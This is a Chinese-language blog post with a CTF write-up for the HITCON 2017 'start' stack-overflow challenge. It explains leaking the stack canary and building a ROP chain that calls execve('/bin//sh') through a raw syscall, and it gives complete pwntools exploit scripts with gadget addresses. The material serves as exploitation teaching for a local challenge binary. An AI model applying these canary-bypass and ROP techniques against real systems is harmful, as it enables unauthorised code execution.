---
layout:     post
title:      "Stack overflow pwnd using syscall"
subtitle:   "栈溢出利用--syscall"
date:       2017-11-13 07:30:00 -0800
author:     "Dafeng"
header-img: "img/post-bg-rwd.jpg"
header-mask: 0.3
catalog: true
tags:
    - CTF
    - Pwn
---

### 简述
此次hitcon 2017 pwn部分的第一题，题型为栈溢出，利用syscall系统调用完成程序栈溢出利用，然后此题要求使用ruby版的pwntools，使得我2天ruby从入门到放弃，再也不碰ruby，毕竟我是python粉啊! 人生苦短，我用python...

### 题目分析
#### 反编译
使用IDA反编译程序：
![main](/img/start/main.png)
分析程序可知，程序往v4的buffer区内读入217个字节，但是v4首地址距离栈帧底rbp位置是0x20,当读入程序时发生栈溢出。

#### 动态调试
使用gdb peda调试程序，检查程序打开的开关
![checksec](/img/start/checksec.png)
栈中有canary保护，并且栈不可执行，但是结合程序后面的puts函数，可以打印出canary的值，后续绕过栈cookie后，再想办法构造rop。

##### 确定canary的值
根据函数栈结构可知，栈帧的返回地址为rbp + 8, canary一般位于rbp前，我们猜测v4 buffer的长度为24， canary大小为8，rbp大小也为8， rbp距离v4首地址40的位置，写脚本验证。
```python
from pwn import *

context(log_level='debug')
p = process("./start")
print proc.pidof(p)

raw_input("...")
p.send("A" * 24 + "B")

p.recvuntil("A" * 24 + "B" )
leak = p.recvuntil("\n")
canary = u64(leak[0:7].rjust(8, '\x00'))

payload = "A" * 24 + p64(canary) + "BBBBBBBB"
p.send(payload)

p.recv(32)
sleep(1)

p.send("exit\n")
sleep(1)

p.interactive()
```
执行该脚本可以获取canary的值:
![canar](/img/start/canary.png)

##### 利用ROPgadget构造rop链
本来准备构造rop链跳转到onegadget位置（libc中execve位置），结果分析半天，程序根本就没有给libc，而且程序根本就不调用libc。那么直接利用ROPgadget chain或者自己构造rop链，
> 如：ROPgadget --binary ./start --ropchain

此处自己构造ropchain，看起来会好看点

#### 程序利用思路
由于程序没有system函数调用，并且也没有libc，程序栈不可以执行，这种情况下，虽然可以利用栈溢出来执行mmap函数映射出一块可写可执行的区域，然后再把shellcode放到这个区域内，但是相对麻烦，程序中大量的使用syscall系统调用，因此我们直接使用execve系统调用来执行/bin/sh。
> execve("/bin//sh", 0, 0)

在x64系统中execve是59号系统调用，因此在执行syscall是将rax值置为59, 而execve的参数分别为 (char*)$rdi = "/bin//sh", $rsi = 0, $

#### 利用脚本
solve.py
```python
from pwn import *

#使用ROPgadget获取一下gadgets地址

#  0x0000000000443776 : pop rdx ; ret
#  0x0000000000418de0 : mov rax, rdx ; ret
#将栈上的值赋给rdx，然后赋给rax，是rax的值是59


#  0x00000000004017f7 : pop rsi ; ret
#  0x00000000004005d5 : pop rdi ; ret
#  0x00000000004279DB   mov  [rdi], rsi
# 将"/bin//sh"赋值给rsi， 然后将rsi的值赋值给rdi执行的的地址

#  0x0000000000443799 : pop rdx ; pop rsi ; ret
#  0x0000000000468e75 : syscall
# 将栈上的数值0,0分别赋值给rdx，rsi，然后执行syscall,此时rax=59, rdi的值是"/bin//sh"的指针，rsi=0， rdx=0, 执行syscall就相当于执行execve("/bin//sh",0,0)


context(log_level='debug')
p = process("./start")
print proc.pidof(p)

raw_input("...")
p.send("A" * 24 + "B")

p.recvuntil("A" * 24 + "B" )
leak = p.recvuntil("\n")
canary = u64(leak[0:7].rjust(8, '\x00'))


# sleep(1)
prdxret = 0x443776
mraxrdx = 0x418de0
prdiret = 0x4005d5
prdxrsiret = 0x443799
syscall = 0x468e75
prsiret = 0x4017f7
mrdirsi = 0x4279DB

payload1 = "A" * 24 + p64(canary) + p64(0x6cc082)
payload1 += p64(prdxret)+p64(59) + p64(mraxrdx)
payload1 += p64(prsiret) + '/bin//sh' + p64(prdiret) + p64(0x6cc0fa) + p64(mrdirsi)
payload1 += p64(prdxrsiret)+ p64(0) + p64(0)
payload1 += p64(syscall)


p.send(payload1)

p.recv(32)
sleep(1)

p.send("exit\n")
sleep(1)
p.interactive()
```

#### 结果
执行python solve.py:
![pwnd](/img/start/pwnd.png)
拿到shell


### 总结
主要是通过构造rop链来实现利用syscall系统调用来执行execve("/bin//sh", 0, 0)， interesting, isn't it?
